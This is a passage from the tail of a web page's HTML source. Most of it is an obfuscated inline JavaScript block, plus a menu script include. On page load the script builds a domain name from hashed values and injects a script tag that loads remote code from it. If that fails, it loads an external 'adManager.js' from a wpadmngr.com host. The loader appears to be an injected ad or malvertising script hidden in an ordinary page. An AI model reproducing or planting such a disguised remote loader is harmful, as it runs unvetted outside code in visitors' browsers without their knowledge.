v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>